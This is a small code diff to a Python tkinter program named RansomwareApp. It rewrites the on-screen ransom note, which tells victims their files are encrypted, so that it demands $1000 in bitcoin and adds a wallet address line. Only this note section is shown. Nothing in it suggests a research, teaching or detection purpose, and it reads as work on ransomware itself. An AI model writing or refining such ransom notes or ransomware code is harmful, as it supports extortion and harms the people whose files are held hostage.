@@ -38,7 +38,8 @@ class RansomwareApp(tk.Tk):
             "What happened to my computer?\n"
             "All your important personal files have been encrypted,\n"
             "and all of these documents are no longer accessible.\n\n"
-            "Please pay $1000 for us to decrypt your files :J"
+            "Please pay $1000 worth of bitcoin for us to decrypt your files :J\n\n\n"
+            "Wallet Address: 1f3YIXo6YTbweBeO61CWOyHkQzH8ub2fHZ"
         )
         self.note_label = tk.Label(self.note_frame, text=note_text, bg="white", fg="black", font=("Arial", 12))
         self.note_label.pack(pady=20, padx=40, fill=tk.BOTH)
